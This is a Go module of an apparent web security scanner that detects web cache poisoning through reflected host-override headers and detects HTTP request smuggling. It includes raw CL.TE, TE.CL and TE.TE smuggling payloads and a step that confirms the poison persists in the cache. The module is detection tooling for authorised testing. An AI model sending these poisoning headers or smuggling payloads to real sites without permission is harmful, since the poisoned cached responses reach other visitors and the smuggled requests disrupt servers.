package cachepoison

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"scanner/internal/modules/shared"
)

// Finding bundles one cache-poisoning OR smuggling observation.
type Finding struct {
	URL         string `json:"url"`
	Class       string `json:"class"` // "cache_poison" | "smuggling"
	Header      string `json:"header,omitempty"`
	Payload     string `json:"payload,omitempty"`
	Severity    string `json:"severity"`
	Title       string `json:"title"`
	Detail      string `json:"detail"`
	Evidence    string `json:"evidence,omitempty"`
	RawRequest  string `json:"raw_request,omitempty"`
	RawResponse string `json:"raw_response,omitempty"`
}

type URLResult struct {
	URL      string    `json:"url"`
	Findings []Finding `json:"findings"`
	Tested   int       `json:"tested"`
	Error    string    `json:"error,omitempty"`
}

type ScanResult struct {
	Results []URLResult `json:"results"`
}

type Config struct {
	URLs         []string
	TestPoison   bool
	TestSmuggle  bool
	EvilHost     string
	Concurrency  int
	Timeout      time.Duration
}

type ProgressFunc func(done int, msg string)
type PartialFunc func(*ScanResult)

func Scan(ctx context.Context, cfg Config, opts *shared.HTTPOptions, progress ProgressFunc, partial PartialFunc) *ScanResult {
	if cfg.EvilHost == "" {
		cfg.EvilHost = "scanner-evil.example"
	}
	if cfg.Concurrency <= 0 {
		cfg.Concurrency = 4
	}
	if cfg.Timeout <= 0 {
		cfg.Timeout = 10 * time.Second
	}

	result := &ScanResult{}
	var mu sync.Mutex
	sem := make(chan struct{}, cfg.Concurrency)
	var wg sync.WaitGroup
	done := 0
	// Audit S2: throttle per-URL snapshot+marshal to 2s.
	throttle := shared.NewPartialThrottler(2 * time.Second)

	for _, u := range cfg.URLs {
		if ctx.Err() != nil {
			break
		}
		wg.Add(1)
		sem <- struct{}{}
		go func(target string) {
			defer wg.Done()
			defer func() { <-sem }()
			ur := probeURL(ctx, target, cfg, opts)
			mu.Lock()
			result.Results = append(result.Results, ur)
			done++
			cur := done
			mu.Unlock()
			if progress != nil {
				progress(cur, fmt.Sprintf("[%d/%d] %s — %d finding(s)", cur, len(cfg.URLs), target, len(ur.Findings)))
			}
			if partial != nil && throttle.ShouldFire() {
				mu.Lock()
				snap := &ScanResult{Results: append([]URLResult(nil), result.Results...)}
				mu.Unlock()
				partial(snap)
			}
		}(u)
	}
	wg.Wait()
	if partial != nil {
		throttle.Force()
		mu.Lock()
		snap := &ScanResult{Results: append([]URLResult(nil), result.Results...)}
		mu.Unlock()
		partial(snap)
	}
	return result
}

func probeURL(ctx context.Context, target string, cfg Config, opts *shared.HTTPOptions) URLResult {
	ur := URLResult{URL: target}

	if cfg.TestPoison {
		probePoison(ctx, target, cfg, opts, &ur)
	}
	if cfg.TestSmuggle {
		probeSmuggling(ctx, target, cfg, opts, &ur)
	}
	return ur
}

// ============================================================================
// Cache poisoning
// ============================================================================

// audit M4: expanded from 13 to the full PortSwigger 'Param Miner'
// host-override + IP-spoof + URL-override default set. Covers the
// common cache-poisoning vectors documented in 'Practical Web Cache
// Poisoning' (Kettle 2018) plus the IP-spoofing headers honored by
// CDNs and reverse proxies in production.
var poisonHeaders = []string{
	// Host / scheme / port overrides
	"X-Forwarded-Host", "X-Forwarded-Scheme", "X-Forwarded-Proto", "X-Forwarded-Port",
	"X-Host", "X-Original-Host", "X-Forwarded-Server", "X-HTTP-Host-Override",
	"Forwarded", "X-Forwarded-Path",
	// URL / rewrite overrides
	"X-Original-URL", "X-Rewrite-URL", "X-HTTP-DestinationURL",
	// IP / client identification (commonly trusted by app logic & logged)
	"X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Client-IP",
	"True-Client-IP", "CF-Connecting-IP", "X-Cluster-Client-IP",
	"X-Server-IP", "X-Custom-IP-Authorization", "Via",
}

func probePoison(ctx context.Context, target string, cfg Config, opts *shared.HTTPOptions, ur *URLResult) {
	client := newClient(cfg.Timeout, opts)

	// Step 1: baseline GET to detect cacheability AND establish whether
	// the evil host string already appears organically (audit M8). If
	// it does, every probe would false-positive on coincidental matches
	// (e.g. user picks `attacker.com`, target's Link header already
	// references it).
	baseStatus, baseHeaders, baseLen, baseRawReq, baseRawResp := simpleGet(ctx, client, target, nil, opts)
	if baseStatus == 0 {
		return
	}
	cacheable := looksCacheable(baseHeaders)
	_ = baseLen
	// audit M8: capture baseline reflection of EvilHost so probe hits
	// can be set-diffed against the noise floor.
	_, baseHeaderHit := evilHostReflected(baseHeaders, cfg.EvilHost)
	baseBodyHit, _ := bodyReflects(ctx, client, target, nil, cfg.EvilHost, opts)
	if baseHeaderHit || baseBodyHit {
		ur.Findings = append(ur.Findings, Finding{
			URL:         target,
			Class:       "cache_poison",
			Severity:    "INFO",
			Title:       "Baseline already contains EvilHost — header probes skipped",
			Detail:      fmt.Sprintf("The target's normal response already includes the sentinel %q. Pick a different evil_host to get meaningful reflection results.", cfg.EvilHost),
			RawRequest:  baseRawReq,
			RawResponse: baseRawResp,
		})
		return
	}

	// Step 2: try each header in turn.
	for _, hname := range poisonHeaders {
		ur.Tested++
		extra := http.Header{hname: []string{cfg.EvilHost}}
		st, hdrs, ln, rawReq, rawResp := simpleGet(ctx, client, target, extra, opts)
		_ = ln
		if st == 0 {
			continue
		}
		// If the response body / Location / Link header reflects evilHost
		// AND the response is cacheable, we have a finding.
		// Heuristics: check Location, Link, common reflection points.
		evidence, hit := evilHostReflected(hdrs, cfg.EvilHost)
		if !hit {
			// Re-fetch body for inline reflection.
			bodyHit, snippet := bodyReflects(ctx, client, target, extra, cfg.EvilHost, opts)
			if bodyHit {
				hit = true
				evidence = snippet
			}
		}
		if !hit {
			continue
		}
		sev := "MEDIUM"
		title := fmt.Sprintf("Reflection via %s%s", hname, suffixIfCacheable(cacheable))
		detail := fmt.Sprintf("Setting %s: %s gets reflected in response. Combined with cache, this poisons every subsequent visitor.", hname, cfg.EvilHost)
		if cacheable {
			sev = "HIGH"
			// audit M6: confirm poison persistence with a clean follow-up
			// request. The canonical cache-poisoning exploit primitive is
			// that the poisoned response is served to a subsequent client
			// that did NOT send the malicious header.
			time.Sleep(250 * time.Millisecond)
			confirmed, confirmEvidence := confirmPoisonPersists(ctx, client, target, cfg.EvilHost, opts)
			if confirmed {
				sev = "CRITICAL"
				title = fmt.Sprintf("Confirmed cache poisoning via %s — poison persisted into clean follow-up", hname)
				detail = fmt.Sprintf("Setting %s: %s reflects AND a subsequent clean GET (no malicious headers) returned the poisoned response. This is the canonical exploit primitive.", hname, cfg.EvilHost)
				if confirmEvidence != "" {
					evidence = "clean-followup: " + confirmEvidence
				}
			} else {
				// Cacheable + reflection but clean re-fetch didn't carry the
				// poison — downgrade so users know it isn't a confirmed primitive.
				sev = "LOW"
				title = fmt.Sprintf("Reflection via %s but poison did not persist", hname)
				detail = fmt.Sprintf("Setting %s: %s reflects in the response and the URL appears cacheable, but a clean follow-up GET did not return the poisoned content. Cache key may include the header, or the cache TTL is too short to observe.", hname, cfg.EvilHost)
			}
		}
		ur.Findings = append(ur.Findings, Finding{
			URL:         target,
			Class:       "cache_poison",
			Header:      hname,
			Severity:    sev,
			Title:       title,
			Detail:      detail,
			Evidence:    evidence,
			RawRequest:  rawReq,
			RawResponse: rawResp,
		})
	}

	if cacheable && len(ur.Findings) == 0 {
		ur.Findings = append(ur.Findings, Finding{
			URL: target, Class: "cache_poison",
			Severity:    "INFO",
			Title:       "Cacheable response — no reflection found",
			Detail:      "URL appears cacheable (Cache-Control / Age header present). No headers reflected with our default list, but worth manual review with custom probe headers.",
			Evidence:    summarizeCacheHeaders(baseHeaders),
			RawRequest:  baseRawReq,
			RawResponse: baseRawResp,
		})
	}
}

func looksCacheable(h http.Header) bool {
	cc := strings.ToLower(h.Get("Cache-Control"))
	if cc == "" {
		// No CC header — many CDNs cache by default.
		return h.Get("Age") != "" || h.Get("X-Cache") != ""
	}
	if strings.Contains(cc, "no-store") || strings.Contains(cc, "private") {
		return false
	}
	return true
}

func evilHostReflected(h http.Header, evilHost string) (string, bool) {
	hostLow := strings.ToLower(evilHost)
	for k, vals := range h {
		for _, v := range vals {
			if strings.Contains(strings.ToLower(v), hostLow) {
				return fmt.Sprintf("%s: %s", k, v), true
			}
		}
	}
	return "", false
}

// confirmPoisonPersists issues a clean GET (no malicious headers) to the
// same URL and looks for the EvilHost string in both response headers and
// body. A hit means the cache served the poisoned response to a client
// that never sent the malicious header — the canonical exploit primitive.
// audit M6.
func confirmPoisonPersists(ctx context.Context, client *http.Client, target, evilHost string, opts *shared.HTTPOptions) (bool, string) {
	req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
	if err != nil {
		return false, ""
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 scaNNer/Cache-Confirm")
	if opts != nil {
		opts.ApplyTo(req)
	}
	resp, err := client.Do(req)
	if err != nil {
		return false, ""
	}
	defer resp.Body.Close()
	if ev, hit := evilHostReflected(resp.Header, evilHost); hit {
		return true, ev
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	low := strings.ToLower(string(body))
	if i := strings.Index(low, strings.ToLower(evilHost)); i >= 0 {
		start := i - 50
		if start < 0 {
			start = 0
		}
		end := i + 100
		if end > len(body) {
			end = len(body)
		}
		return true, strings.ReplaceAll(string(body[start:end]), "\n", " ")
	}
	return false, ""
}

func bodyReflects(ctx context.Context, client *http.Client, target string, extra http.Header, evilHost string, opts *shared.HTTPOptions) (bool, string) {
	req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
	if err != nil {
		return false, ""
	}
	for k, vs := range extra {
		for _, v := range vs {
			req.Header.Add(k, v)
		}
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 scaNNer/Cache")
	if opts != nil {
		opts.ApplyTo(req)
	}
	resp, err := client.Do(req)
	if err != nil {
		return false, ""
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	low := strings.ToLower(string(body))
	if i := strings.Index(low, strings.ToLower(evilHost)); i >= 0 {
		start := i - 50
		if start < 0 {
			start = 0
		}
		end := i + 100
		if end > len(body) {
			end = len(body)
		}
		return true, strings.ReplaceAll(string(body[start:end]), "\n", " ")
	}
	return false, ""
}

func suffixIfCacheable(cacheable bool) string {
	if cacheable {
		return " (CACHEABLE → poisons all visitors)"
	}
	return " (no cache observed)"
}

func summarizeCacheHeaders(h http.Header) string {
	keys := []string{"Cache-Control", "Age", "X-Cache", "X-Cache-Hits", "CF-Cache-Status", "X-Served-By"}
	var b strings.Builder
	for _, k := range keys {
		if v := h.Get(k); v != "" {
			fmt.Fprintf(&b, "%s: %s | ", k, v)
		}
	}
	return strings.TrimSuffix(b.String(), " | ")
}

// ============================================================================
// HTTP Request Smuggling — best-effort detection
// ============================================================================

func probeSmuggling(ctx context.Context, target string, cfg Config, opts *shared.HTTPOptions, ur *URLResult) {
	u, err := url.Parse(target)
	if err != nil {
		return
	}
	host := u.Host
	useTLS := u.Scheme == "https"
	if !strings.Contains(host, ":") {
		if useTLS {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	path := u.RequestURI()
	if path == "" {
		path = "/"
	}

	// CL.TE detect: send Content-Length AND Transfer-Encoding: chunked.
	// If the front-end honors CL and back-end honors TE, the back-end
	// will park awaiting more data → connection times out OR returns slowly.
	ur.Tested++
	clteResp, clteErr := sendRaw(ctx, host, useTLS, cfg.Timeout, buildCLTE(path, u.Host))
	if isSmugglingTimeout(clteErr, clteResp) {
		ur.Findings = append(ur.Findings, Finding{
			URL:      target,
			Class:    "smuggling",
			Severity: "HIGH",
			Title:    "Possible CL.TE smuggling",
			Detail:   "Front-end appears to use Content-Length while back-end uses Transfer-Encoding: chunked. Response delayed/timed-out as expected of a parked back-end socket.",
			Evidence: truncate(clteResp, 600),
			RawRequest: buildCLTE(path, u.Host),
		})
	}

	// TE.CL detect: reverse — front-end TE, back-end CL.
	ur.Tested++
	teclResp, teclErr := sendRaw(ctx, host, useTLS, cfg.Timeout, buildTECL(path, u.Host))
	if isSmugglingTimeout(teclErr, teclResp) {
		ur.Findings = append(ur.Findings, Finding{
			URL:      target,
			Class:    "smuggling",
			Severity: "HIGH",
			Title:    "Possible TE.CL smuggling",
			Detail:   "Front-end appears to use Transfer-Encoding: chunked, back-end uses Content-Length. Response delayed/timed-out.",
			Evidence: truncate(teclResp, 600),
			RawRequest: buildTECL(path, u.Host),
		})
	}

	// TE.TE detect: obfuscated Transfer-Encoding header — one component
	// strips/normalizes it, the other doesn't.
	ur.Tested++
	teteResp, teteErr := sendRaw(ctx, host, useTLS, cfg.Timeout, buildTETE(path, u.Host))
	if isSmugglingTimeout(teteErr, teteResp) {
		ur.Findings = append(ur.Findings, Finding{
			URL:      target,
			Class:    "smuggling",
			Severity: "HIGH",
			Title:    "Possible TE.TE smuggling (obfuscation)",
			Detail:   "An obfuscated Transfer-Encoding header (e.g. `Transfer-Encoding : chunked`) appears to be processed differently by front-end vs back-end.",
			Evidence: truncate(teteResp, 600),
			RawRequest: buildTETE(path, u.Host),
		})
	}
}

func buildCLTE(path, host string) string {
	body := "0\r\n\r\nGET /poison HTTP/1.1\r\nHost: " + host + "\r\n\r\n"
	headers := strings.Join([]string{
		"POST " + path + " HTTP/1.1",
		"Host: " + host,
		"Connection: keep-alive",
		"Content-Type: text/plain",
		// audit M5: Content-Length must exactly match the bytes sent for
		// the front-end (CL parser) to forward the full body. Previously
		// used `len(body)+4` which over-declared, making the front-end
		// block waiting for bytes that never come.
		fmt.Sprintf("Content-Length: %d", len(body)),
		"Transfer-Encoding: chunked",
		"User-Agent: scaNNer/Smuggle",
		"", "",
	}, "\r\n")
	return headers + body
}

func buildTECL(path, host string) string {
	// audit M5: chunk size must dynamically reflect the actual inner
	// payload length. The previous hard-coded `5c` (92 bytes) declared
	// a longer chunk than the body, so any conformant chunked-encoding
	// parser saw the terminating `0\r\n` early and 400'd the request.
	inner := "GPOST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 6\r\n\r\nx=1\r\n"
	bodyTrue := fmt.Sprintf("%x\r\n%s\r\n0\r\n\r\n", len(inner), inner)
	headers := strings.Join([]string{
		"POST " + path + " HTTP/1.1",
		"Host: " + host,
		"Connection: keep-alive",
		"Content-Type: text/plain",
		"Content-Length: 4", // small value to fool back-end
		"Transfer-Encoding: chunked",
		"User-Agent: scaNNer/Smuggle",
		"", "",
	}, "\r\n")
	return headers + bodyTrue
}

func buildTETE(path, host string) string {
	body := "0\r\n\r\nGET /poison HTTP/1.1\r\nHost: " + host + "\r\n\r\n"
	headers := strings.Join([]string{
		"POST " + path + " HTTP/1.1",
		"Host: " + host,
		"Connection: keep-alive",
		"Content-Type: text/plain",
		fmt.Sprintf("Content-Length: %d", len(body)),
		"Transfer-Encoding: chunked",
		"Transfer-encoding: x", // obfuscation: extra header, mixed case
		"User-Agent: scaNNer/Smuggle",
		"", "",
	}, "\r\n")
	return headers + body
}

func sendRaw(ctx context.Context, host string, useTLS bool, timeout time.Duration, req string) (string, error) {
	// Raw smuggling probe also goes through the killswitch dialer.
	d := shared.BoundDialer(nil, timeout)
	dialCtx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	var conn net.Conn
	var err error
	if useTLS {
		// audit M2/M9: tls.Dial ignored both the killswitch dialer AND the
		// scan-level context — a misbehaving server could stall the handshake
		// for the kernel TCP timeout (~minutes), defeating cancellation. Use
		// a tls.Dialer with the killswitch-aware net.Dialer so both source-IP
		// binding and context propagation are honored.
		tlsDialer := &tls.Dialer{
			NetDialer: d,
			Config:    &tls.Config{InsecureSkipVerify: true},
		}
		conn, err = tlsDialer.DialContext(dialCtx, "tcp", host)
	} else {
		conn, err = d.DialContext(dialCtx, "tcp", host)
	}
	if err != nil {
		return "", err
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))
	if _, err := io.WriteString(conn, req); err != nil {
		return "", err
	}
	b := bufio.NewReader(conn)
	buf := make([]byte, 4*1024)
	n, err := b.Read(buf)
	if err != nil && n == 0 {
		return "", err
	}
	return string(buf[:n]), err
}

// isSmugglingTimeout determines whether the raw socket read result indicates
// the back-end is parked waiting for the smuggled bytes — the classic
// CL.TE / TE.CL signature — OR whether the response body itself contains
// positive evidence that a smuggled second request was processed.
//
// audit M7: the previous implementation had a dead-code path — both
// branches after `resp != ""` returned false, so non-error detection
// was impossible. We now fire on timeout/deadline errors AND on
// positive-response signals (two concatenated HTTP responses on the
// same socket, or the smuggled payload's `/poison` / `GPOST` artifacts
// echoed in the response), so we no longer miss the case where the
// back-end returned quickly with two responses instead of parking.
func isSmugglingTimeout(err error, resp string) bool {
	if err != nil {
		low := strings.ToLower(err.Error())
		if strings.Contains(low, "timeout") || strings.Contains(low, "deadline") {
			return true
		}
	}
	if resp == "" {
		return false
	}
	// Early-reject: a clean 400/501 from the front-end means the request
	// was rejected outright, not smuggled through. Don't flag those.
	if strings.Contains(resp, "400 Bad Request") || strings.Contains(resp, "501 ") {
		return false
	}
	// Positive signal 1: two HTTP status lines on the same connection is
	// the canonical proof that a smuggled second request was serviced.
	if strings.Count(resp, "HTTP/1.") >= 2 {
		return true
	}
	// Positive signal 2: the smuggled artifacts (`/poison` from CL.TE,
	// `GPOST` from TE.CL/TE.TE) echoed back in the response body — e.g.
	// a 404 for /poison, or a method-not-allowed for GPOST.
	if strings.Contains(resp, "/poison") || strings.Contains(resp, "GPOST") {
		return true
	}
	return false
}

func simpleGet(ctx context.Context, client *http.Client, target string, extra http.Header, opts *shared.HTTPOptions) (int, http.Header, int, string, string) {
	req, err := http.NewRequestWithContext(ctx, "GET", target, nil)
	if err != nil {
		return 0, nil, 0, "", ""
	}
	for k, vs := range extra {
		for _, v := range vs {
			req.Header.Add(k, v)
		}
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 scaNNer/Cache")
	if opts != nil {
		opts.ApplyTo(req)
	}
	rawReq := shared.CaptureRequest(req)
	resp, err := client.Do(req)
	if err != nil {
		if opts != nil {
			opts.RecordError(shared.ClassifyError(err))
		}
		return 0, nil, 0, rawReq, ""
	}
	// defer Close so a panic in CaptureResponse / ReadAll (rare but real
	// under heap pressure) doesn't leak the response body — these calls
	// accumulate over the 2-day audit window. Manual Close at the bottom
	// was fragile to future refactors that might insert an early return.
	defer resp.Body.Close()
	rawResp := shared.CaptureResponse(resp)
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
	return resp.StatusCode, resp.Header, len(body), rawReq, rawResp
}

func newClient(timeout time.Duration, opts *shared.HTTPOptions) *http.Client {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext:     shared.BoundDialer(nil, timeout).DialContext,
		// Per-target transport: bound + self-expire idle sockets so they don't
		// accumulate across a large scan's targets.
		IdleConnTimeout:     90 * time.Second,
		MaxIdleConnsPerHost: 4,
	}
	if opts != nil {
		opts.ApplyTransport(transport)
	}
	return &http.Client{Timeout: timeout, Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
